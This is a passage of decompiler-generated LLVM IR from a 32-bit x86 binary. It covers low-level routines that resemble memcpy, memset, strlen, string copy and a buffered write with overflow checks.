  %v5_8051d40 = icmp slt i32 %v1_8051d37, %v1_8051d3b
  br i1 %v5_8051d40, label %dec_label_pc_8051cb8, label %dec_label_pc_8051d6e

dec_label_pc_8051d47:                             ; preds = %dec_label_pc_8051cab
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051d4b = add i32 %tmp76, 38
  %v2_8051d4b = inttoptr i32 %v1_8051d4b to i8*
  store i8 1, i8* %v2_8051d4b, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051d54 = add i32 %tmp76, 28
  %v2_8051d54 = inttoptr i32 %v1_8051d54 to i32*
  %v3_8051d54 = load i32, i32* %v2_8051d54, align 4
  %v2_8051d57 = mul i32 %v3_8051d54, 4
  %v2_8051d5b = ptrtoint i32* %stack_var_-20 to i32
  %v1_8051d62 = add i32 %tmp76, 40
  store i32 %v1_8051d62, i32* %eax.global-to-local, align 4
  %v3_8051d66 = inttoptr i32 %v1_8051d62 to i16*
  %v4_8051d66 = call i32 @function_8051e5c(i16* %v3_8051d66, i32 %v2_8051d5b, i32 %v2_8051d57)
  store i32 %v4_8051d66, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d6e

dec_label_pc_8051d6e:                             ; preds = %dec_label_pc_8051d33, %dec_label_pc_8051d47
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051d47 ], [ %stack_var_-88.5, %dec_label_pc_8051d33 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_8051d76 = inttoptr i32 %v1_8051a17 to i8*
  %v3_8051d76 = load i8, i8* %v2_8051d76, align 1
  %v5_8051d76 = icmp slt i8 %v3_8051d76, 0
  store i32 %stack_var_-88.6, i32* %v2_8051a10, align 4
  br i1 %v5_8051d76, label %dec_label_pc_8051d86, label %dec_label_pc_8051d7f

dec_label_pc_8051d7f:                             ; preds = %dec_label_pc_8051d6e
  %v0_8051d7f = load i32, i32* @esi, align 4
  %v1_8051d7f = add i32 %v0_8051d7f, 1
  store i32 %v1_8051d7f, i32* %eax.global-to-local, align 4
  %v1_8051d82 = load i32, i32* @ecx, align 4
  %v2_8051d82 = inttoptr i32 %v1_8051d82 to i32*
  store i32 %v1_8051d7f, i32* %v2_8051d82, align 4
  br label %dec_label_pc_8051d99

dec_label_pc_8051d86:                             ; preds = %dec_label_pc_8051d6e
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_80519e4, i32* %edx.global-to-local, align 4
  %v0_8051d8e = load i32, i32* @esi, align 4
  %v2_8051d8e = sub i32 %v0_8051d8e, %v4_80519e4
  store i32 %v2_8051d8e, i32* %esi.global-to-local, align 4
  %v1_8051d90 = mul i32 %v2_8051d8e, 4
  %v2_8051d90 = add i32 %v1_8051d90, 224
  store i32 %v2_8051d90, i32* %eax.global-to-local, align 4
  %v2_8051d97 = load i32, i32* %arg1, align 4
  %v4_8051d97 = add i32 %v2_8051d97, %v2_8051d90
  store i32 %v4_8051d97, i32* %arg1, align 4
  br label %dec_label_pc_8051d99

dec_label_pc_8051d99:                             ; preds = %dec_label_pc_8051d7f, %dec_label_pc_8051d86
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051d9d = add i32 %tmp76, 28
  %v2_8051d9d = inttoptr i32 %v1_8051d9d to i32*
  %v3_8051d9d = load i32, i32* %v2_8051d9d, align 4
  store i32 %v3_8051d9d, i32* %eax.global-to-local, align 4
  %v1_8051da0 = add i32 %v3_8051d9d, 2
  br label %dec_label_pc_8051da8

dec_label_pc_8051da5:                             ; preds = %dec_label_pc_8051a35, %dec_label_pc_8051acf, %dec_label_pc_8051b02, %dec_label_pc_8051b7d, %dec_label_pc_8051b69, %dec_label_pc_8051b60, %dec_label_pc_8051cdd, %dec_label_pc_8051c94, %dec_label_pc_8051bdf
  br label %dec_label_pc_8051da8

dec_label_pc_8051da8:                             ; preds = %dec_label_pc_8051d99, %dec_label_pc_8051da5
  %storemerge6 = phi i32 [ %v1_8051da0, %dec_label_pc_8051d99 ], [ -1, %dec_label_pc_8051da5 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8051dab = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051dab, i32* @ebx, align 4
  store i32 %v0_80519e3, i32* @esi, align 4
  store i32 %v0_80519e2, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_8051d37, { 0, 2, 1 }
  uselistorder i32 %v2_8051d17, { 1, 2, 0 }
  uselistorder i32 %v1_8051d09, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8051cea, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051cdd, { 1, 0 }
  uselistorder i32 %v5_8051cd7, { 1, 2, 0 }
  uselistorder i32 %v0_8051cea, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8051cb8, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051cce, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_8051c49, { 1, 2, 0 }
  uselistorder i32 %v1_8051c1f, { 1, 2, 0 }
  uselistorder i32 %v0_8051c49, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051be5, { 1, 0 }
  uselistorder i32 %v1_8051bd2, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8051bdb, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8051bc5, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8051bbb, { 1, 0 }
  uselistorder i32 %v1_8051b9d, { 1, 0 }
  uselistorder i32 %v0_8051bbb.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8051b80, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8051b77, { 1, 2, 0 }
  uselistorder i32 %v0_8051b3d, { 1, 0 }
  uselistorder i32 %v1_8051b2f, { 1, 0 }
  uselistorder i32 %v1_8051b2a, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8051b28, { 2, 0, 1 }
  uselistorder i32 %v0_8051b4a, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8051ae5, { 1, 2, 0 }
  uselistorder i32 %v0_8051abd, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_8051ab3, { 1, 2, 0 }
  uselistorder i32 %v6_8051ab1, { 0, 2, 1 }
  uselistorder i32 %v0_8051ab0, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8051aa9, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8051aa9, { 2, 1, 0 }
  uselistorder i32 %v1_8051aa1, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_8051a87, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051a5d, { 0, 2, 1 }
  uselistorder i32 %v0_8051a4a, { 2, 0, 1 }
  uselistorder i32 %v4_80519e4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @function_80519b8, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134594795, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805c0f5.317 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051da8, { 1, 0 }
  uselistorder label %dec_label_pc_8051da5, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051d99, { 1, 0 }
  uselistorder label %dec_label_pc_8051d6e, { 1, 0 }
  uselistorder label %dec_label_pc_8051d33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051cd7, { 1, 0 }
  uselistorder label %dec_label_pc_8051cab, { 1, 0 }
  uselistorder label %dec_label_pc_8051c13, { 1, 0 }
  uselistorder label %dec_label_pc_8051bdf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051bb6, { 1, 0 }
  uselistorder label %dec_label_pc_8051b8d, { 1, 0 }
  uselistorder label %dec_label_pc_8051b54, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8051af7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ab1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8051a97, { 1, 0 }
  uselistorder label %dec_label_pc_8051a80, { 1, 0 }
  uselistorder label %dec_label_pc_8051a80.outer, { 2, 0, 1 }
}

define i32 @function_8051db0() local_unnamed_addr {
dec_label_pc_8051db0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051db0 = load i32, i32* @esi, align 4
  %v0_8051db1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051db1, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @ebx, align 4
  %v1_8051dba = inttoptr i32 %tmp1 to i8*
  %v2_8051dba = call i32 @function_8051ef8(i8* %v1_8051dba)
  store i32 %v2_8051dba, i32* @esi, align 4
  %v0_8051dcb = load i32, i32* @ebx, align 4
  %v5_8051dcc = call i32 @function_8051de4(i32 %v0_8051dcb, i64 1, i32 %v2_8051dba, i32 %tmp)
  %v1_8051dd6 = load i32, i32* @esi, align 4
  %v12_8051dd6 = icmp eq i32 %v5_8051dcc, %v1_8051dd6
  %v3_8051dd8 = select i1 %v12_8051dd6, i32 %v5_8051dcc, i32 -1
  %v2_8051dde = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051dde, i32* @ebx, align 4
  store i32 %v0_8051db0, i32* @esi, align 4
  ret i32 %v3_8051dd8

; uselistorder directives
  uselistorder i32 %v5_8051dcc, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @function_8051de4(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051de4:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051de4 = load i32, i32* @edi, align 4
  %v0_8051de5 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8051deb = trunc i64 %arg2 to i32
  store i32 %v4_8051deb, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051df3 = inttoptr i32 %arg4 to i16*
  %v2_8051df3 = load i16, i16* %v1_8051df3, align 2
  %v1_8051df6 = and i16 %v2_8051df3, 192
  %v6_8051dfb = icmp eq i16 %v1_8051df6, 192
  br i1 %v6_8051dfb, label %dec_label_pc_8051e16, label %dec_label_pc_8051e02

dec_label_pc_8051e02:                             ; preds = %dec_label_pc_8051de4
  %v0_8051e02 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8051e0a = call i32 @function_805488c(i16* %v1_8051df3, i32 128, i32 %v0_8051e02, i32 %v0_8051e02)
  %v1_8051e12 = icmp eq i32 %v6_8051e0a, 0
  %v1_8051e14 = icmp eq i1 %v1_8051e12, false
  br i1 %v1_8051e14, label %dec_label_pc_8051e56, label %dec_label_pc_8051e16

dec_label_pc_8051e16:                             ; preds = %dec_label_pc_8051e02, %dec_label_pc_8051de4
  %v2_8051e16 = icmp eq i32 %v4_8051deb, 0
  br i1 %v2_8051e16, label %dec_label_pc_8051e56, label %dec_label_pc_8051e1a

dec_label_pc_8051e1a:                             ; preds = %dec_label_pc_8051e16
  %v1_8051e1a = icmp eq i32 %arg3, 0
  br i1 %v1_8051e1a, label %dec_label_pc_8051e56, label %dec_label_pc_8051e1e

dec_label_pc_8051e1e:                             ; preds = %dec_label_pc_8051e1a
  %v9_8051e23 = udiv i64 4294967295, %arg2
  %v10_8051e23 = trunc i64 %v9_8051e23 to i32
  %v6_8051e27 = icmp ult i32 %v10_8051e23, %arg3
  br i1 %v6_8051e27, label %dec_label_pc_8051e43, label %dec_label_pc_8051e29

dec_label_pc_8051e29:                             ; preds = %dec_label_pc_8051e1e
  %sext = mul i64 %arg2, 4294967296
  %v2_8051e2c = sdiv i64 %sext, 4294967296
  %v3_8051e2c = sext i32 %arg3 to i64
  %v4_8051e2c = mul nsw i64 %v3_8051e2c, %v2_8051e2c
  %v5_8051e2c = trunc i64 %v4_8051e2c to i32
  %v0_8051e2f = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051e35 = call i32 @function_80547a0(i32 %arg1, i32 %v5_8051e2c, i32 %v0_8051e2f, i32 %v10_8051e23)
  %v6_8051e35 = sext i32 %v5_8051e35 to i64
  %v10_8051e3f = udiv i64 %v6_8051e35, %arg2
  %v11_8051e3f = trunc i64 %v10_8051e3f to i32
  br label %dec_label_pc_8051e58

dec_label_pc_8051e43:                             ; preds = %dec_label_pc_8051e1e
  %v0_8051e43 = load i32, i32* @ebx, align 4
  %v1_8051e43 = inttoptr i32 %v0_8051e43 to i32*
  %v2_8051e43 = load i32, i32* %v1_8051e43, align 4
  %v1_8051e45 = or i32 %v2_8051e43, 8
  %v1_8051e48 = trunc i32 %v1_8051e45 to i16
  %v3_8051e48 = inttoptr i32 %v0_8051e43 to i16*
  store i16 %v1_8051e48, i16* %v3_8051e48, align 2
  %v0_8051e4b = load i32, i32* %stack_var_-28, align 4
  %v1_8051e4b = call i32 @function_8050f90(i32 %v0_8051e4b)
  %v1_8051e50 = inttoptr i32 %v1_8051e4b to i32*
  store i32 22, i32* %v1_8051e50, align 4
  br label %dec_label_pc_8051e56

dec_label_pc_8051e56:                             ; preds = %dec_label_pc_8051e1a, %dec_label_pc_8051e16, %dec_label_pc_8051e02, %dec_label_pc_8051e43
  br label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %dec_label_pc_8051e29, %dec_label_pc_8051e56
  %v0_8051e5b = phi i32 [ %v11_8051e3f, %dec_label_pc_8051e29 ], [ 0, %dec_label_pc_8051e56 ]
  store i32 %v0_8051de5, i32* @esi, align 4
  store i32 %v0_8051de4, i32* @edi, align 4
  ret i32 %v0_8051e5b

; uselistorder directives
  uselistorder i32 %v0_8051e02, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80547a0, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e58, { 1, 0 }
  uselistorder label %dec_label_pc_8051e56, { 3, 0, 1, 2 }
}

define i32 @function_8051e5c(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051e5c:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e5d = load i32, i32* @esi, align 4
  store i32 %v0_8051e5d, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051e5e = sdiv i32 %sext, 16777216
  store i32 %v4_8051e5e, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051e66 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051e66, i32* %edi.global-to-local, align 4
  %v2_8051e6c = udiv i32 %v4_8051e5e, 4
  %v3_8051e6f = inttoptr i32 %arg2 to i8*
  %v4_8051e6f = bitcast i16* %arg1 to i8*
  %v5_8051e6f = call i8* @_memcpy(i8* %v4_8051e6f, i8* %v3_8051e6f, i32 %v2_8051e6c)
  %v6_8051e6f = ptrtoint i8* %v5_8051e6f to i32
  store i32 %v6_8051e6f, i32* @ecx, align 4
  %v0_8051e71 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051e71 = and i32 %v0_8051e71, 2
  %v3_8051e71 = icmp eq i32 %v2_8051e71, 0
  br i1 %v3_8051e71, label %dec_label_pc_8051e77, label %dec_label_pc_8051e75

dec_label_pc_8051e75:                             ; preds = %dec_label_pc_8051e5c
  %v0_8051e75 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e75 = inttoptr i32 %v0_8051e75 to i16*
  %v2_8051e75 = load i16, i16* %v1_8051e75, align 2
  %v3_8051e75 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e75 = inttoptr i32 %v3_8051e75 to i16*
  store i16 %v2_8051e75, i16* %v4_8051e75, align 2
  %v5_8051e75 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e75 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e75 = load i1, i1* @df, align 1
  %v8_8051e75 = select i1 %v7_8051e75, i32 -2, i32 2
  %v9_8051e75 = add i32 %v8_8051e75, %v5_8051e75
  %v10_8051e75 = add i32 %v8_8051e75, %v6_8051e75
  store i32 %v9_8051e75, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e75, i32* %esi.global-to-local, align 4
  %v0_8051e77.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e77

dec_label_pc_8051e77:                             ; preds = %dec_label_pc_8051e5c, %dec_label_pc_8051e75
  %v0_8051e77 = phi i32 [ %v0_8051e71, %dec_label_pc_8051e5c ], [ %v0_8051e77.pre, %dec_label_pc_8051e75 ]
  %v2_8051e77 = urem i32 %v0_8051e77, 2
  %v3_8051e77 = icmp eq i32 %v2_8051e77, 0
  br i1 %v3_8051e77, label %dec_label_pc_8051e7c, label %dec_label_pc_8051e7b

dec_label_pc_8051e7b:                             ; preds = %dec_label_pc_8051e77
  %v0_8051e7b = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e7b = inttoptr i32 %v0_8051e7b to i8*
  %v2_8051e7b = load i8, i8* %v1_8051e7b, align 1
  %v3_8051e7b = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e7b = inttoptr i32 %v3_8051e7b to i8*
  store i8 %v2_8051e7b, i8* %v4_8051e7b, align 1
  %v5_8051e7b = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e7b = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e7b = load i1, i1* @df, align 1
  %v8_8051e7b = select i1 %v7_8051e7b, i32 -1, i32 1
  %v9_8051e7b = add i32 %v8_8051e7b, %v5_8051e7b
  %v10_8051e7b = add i32 %v8_8051e7b, %v6_8051e7b
  store i32 %v9_8051e7b, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e7b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051e7c

dec_label_pc_8051e7c:                             ; preds = %dec_label_pc_8051e77, %dec_label_pc_8051e7b
  store i32 %v4_8051e66, i32* %eax.global-to-local, align 4
  %v2_8051e80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051e80, i32* @esi, align 4
  ret i32 %v4_8051e66

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051e7c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e77, { 1, 0 }
}

define i32 @function_8051e84(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051e84:
  %v0_8051e84 = load i32, i32* @edi, align 4
  %v4_8051e8d = ptrtoint i8* %arg1 to i32
  %v5_8051e91 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051e91 = ptrtoint i8* %v5_8051e91 to i32
  store i32 %v6_8051e91, i32* @ecx, align 4
  store i32 %v0_8051e84, i32* @edi, align 4
  ret i32 %v4_8051e8d

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8051ebc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051ebc:
  %v4_8051ebd = ptrtoint i8* %arg1 to i32
  %v2_8051ec5 = mul i32 %arg2, 256
  %v3_8051ec5 = and i32 %v2_8051ec5, 65280
  %v4_8051ec5 = and i32 %arg2, -65281
  %v5_8051ec5 = or i32 %v3_8051ec5, %v4_8051ec5
  %v8_8051ec7.pre = load i1, i1* @df, align 1
  %v9_8051ec7 = select i1 %v8_8051ec7.pre, i32 -1, i32 1
  br label %dec_label_pc_8051ec7

dec_label_pc_8051ec7:                             ; preds = %dec_label_pc_8051ecc, %dec_label_pc_8051ebc
  %v4_8051ec7 = phi i32 [ %v6_8051ec7, %dec_label_pc_8051ecc ], [ %v5_8051ec5, %dec_label_pc_8051ebc ]
  %v7_8051ec7 = phi i32 [ %v10_8051ec7, %dec_label_pc_8051ecc ], [ %v4_8051ebd, %dec_label_pc_8051ebc ]
  %v1_8051ec7 = inttoptr i32 %v7_8051ec7 to i8*
  %v2_8051ec7 = load i8, i8* %v1_8051ec7, align 1
  %v10_8051ec7 = add i32 %v7_8051ec7, %v9_8051ec7
  %v3_8051ec8 = udiv i32 %v4_8051ec7, 256
  %v4_8051ec8 = trunc i32 %v3_8051ec8 to i8
  %v16_8051ec8 = icmp eq i8 %v2_8051ec7, %v4_8051ec8
  br i1 %v16_8051ec8, label %dec_label_pc_8051ed5, label %dec_label_pc_8051ecc

dec_label_pc_8051ecc:                             ; preds = %dec_label_pc_8051ec7
  %v3_8051ec7 = zext i8 %v2_8051ec7 to i32
  %v5_8051ec7 = and i32 %v4_8051ec7, -256
  %v6_8051ec7 = or i32 %v3_8051ec7, %v5_8051ec7
  %v4_8051ecc = icmp eq i8 %v2_8051ec7, 0
  %v1_8051ece = icmp eq i1 %v4_8051ecc, false
  br i1 %v1_8051ece, label %dec_label_pc_8051ec7, label %dec_label_pc_8051ed0

dec_label_pc_8051ed0:                             ; preds = %dec_label_pc_8051ecc
  br label %dec_label_pc_8051ed5

dec_label_pc_8051ed5:                             ; preds = %dec_label_pc_8051ec7, %dec_label_pc_8051ed0
  %v0_8051ed5 = phi i32 [ 1, %dec_label_pc_8051ed0 ], [ %v10_8051ec7, %dec_label_pc_8051ec7 ]
  %v1_8051ed7 = add i32 %v0_8051ed5, -1
  ret i32 %v1_8051ed7

; uselistorder directives
  uselistorder i8 %v2_8051ec7, { 1, 2, 0 }
  uselistorder i32 %v4_8051ec7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051ed5, { 1, 0 }
}

define i32 @function_8051edc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051edc:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051edd = load i32, i32* @esi, align 4
  store i32 %v0_8051edd, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051ee5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ee5, i32* %edi.global-to-local, align 4
  %v4_8051ee9.pre = load i32, i32* @eax, align 4
  %v8_8051ee9.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge, %dec_label_pc_8051edc
  %v2_8051eea = phi i32 [ %v7_8051eea, %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge ], [ %v4_8051ee5, %dec_label_pc_8051edc ]
  %v8_8051ee9 = phi i1 [ %v5_8051eea, %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge ], [ %v8_8051ee9.pre, %dec_label_pc_8051edc ]
  %v4_8051ee9 = phi i32 [ %v0_8051eeb, %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge ], [ %v4_8051ee9.pre, %dec_label_pc_8051edc ]
  %v7_8051ee9 = phi i32 [ %v0_8051ee9.pre, %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge ], [ %arg2, %dec_label_pc_8051edc ]
  %v1_8051ee9 = inttoptr i32 %v7_8051ee9 to i8*
  %v2_8051ee9 = load i8, i8* %v1_8051ee9, align 1
  %v3_8051ee9 = zext i8 %v2_8051ee9 to i32
  %v5_8051ee9 = and i32 %v4_8051ee9, -256
  %v6_8051ee9 = or i32 %v3_8051ee9, %v5_8051ee9
  store i32 %v6_8051ee9, i32* %eax.global-to-local, align 4
  %v9_8051ee9 = select i1 %v8_8051ee9, i32 -1, i32 1
  %v10_8051ee9 = add i32 %v7_8051ee9, %v9_8051ee9
  store i32 %v10_8051ee9, i32* %esi.global-to-local, align 4
  %v3_8051eea = inttoptr i32 %v2_8051eea to i8*
  store i8 %v2_8051ee9, i8* %v3_8051eea, align 1
  %v4_8051eea = load i32, i32* %edi.global-to-local, align 4
  %v5_8051eea = load i1, i1* @df, align 1
  %v6_8051eea = select i1 %v5_8051eea, i32 -1, i32 1
  %v7_8051eea = add i32 %v6_8051eea, %v4_8051eea
  store i32 %v7_8051eea, i32* %edi.global-to-local, align 4
  %v0_8051eeb = load i32, i32* %eax.global-to-local, align 4
  %v3_8051eeb = trunc i32 %v0_8051eeb to i8
  %v4_8051eeb = icmp eq i8 %v3_8051eeb, 0
  %v1_8051eed = icmp eq i1 %v4_8051eeb, false
  br i1 %v1_8051eed, label %dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge, label %dec_label_pc_8051eef

dec_label_pc_8051ee9.dec_label_pc_8051ee9_crit_edge: ; preds = %dec_label_pc_8051ee9
  %v0_8051ee9.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ee9

dec_label_pc_8051eef:                             ; preds = %dec_label_pc_8051ee9
  store i32 %v4_8051ee5, i32* %eax.global-to-local, align 4
  %v2_8051ef4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ef4, i32* %esi.global-to-local, align 4
  ret i32 %v4_8051ee5

; uselistorder directives
  uselistorder i32 %v0_8051eeb, { 1, 0 }
  uselistorder i32 %v7_8051eea, { 1, 0 }
  uselistorder i1 %v5_8051eea, { 1, 0 }
  uselistorder i32 %v4_8051ee5, { 1, 2, 0, 3 }
}

define i32 @function_8051ef8(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051ef8:
  %v0_8051ef8 = load i32, i32* @edi, align 4
  %v3_8051f02 = call i32 @_strlen(i8* %arg1)
  store i32 %v3_8051f02, i32* @ecx, align 4
  store i32 %v0_8051ef8, i32* @edi, align 4
  ret i32 %v3_8051f02
}

define i32 @function_8051f0c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f0c:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f0d = load i32, i32* @esi, align 4
  store i32 %v0_8051f0d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051f19 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051f19, i32* %edi.global-to-local, align 4
  %v1_8051f1d = add i32 %arg3, 1
  store i32 %v1_8051f1d, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f1e

dec_label_pc_8051f1e:                             ; preds = %dec_label_pc_8051f21, %dec_label_pc_8051f0c
  %v3_8051f22 = phi i32 [ %v4_8051f19, %dec_label_pc_8051f0c ], [ %v8_8051f22, %dec_label_pc_8051f21 ]
  %v0_8051f1e = phi i32 [ %v1_8051f1d, %dec_label_pc_8051f0c ], [ %v0_8051f1e.pre, %dec_label_pc_8051f21 ]
  %v1_8051f1e = add i32 %v0_8051f1e, -1
  %v8_8051f1e = icmp eq i32 %v1_8051f1e, 0
  store i32 %v1_8051f1e, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051f1e, label %.loopexit, label %dec_label_pc_8051f21

dec_label_pc_8051f21:                             ; preds = %dec_label_pc_8051f1e
  %v0_8051f21 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051f21 = inttoptr i32 %v0_8051f21 to i8*
  %v2_8051f21 = load i8, i8* %v1_8051f21, align 1
  %v10_8051f21 = load i1, i1* @df, align 1
  %v11_8051f21 = select i1 %v10_8051f21, i32 -1, i32 1
  %v12_8051f21 = add i32 %v11_8051f21, %v0_8051f21
  store i32 %v12_8051f21, i32* %esi.global-to-local, align 4
  %v4_8051f22 = inttoptr i32 %v3_8051f22 to i8*
  store i8 %v2_8051f21, i8* %v4_8051f22, align 1
  %v5_8051f22 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051f22 = load i1, i1* @df, align 1
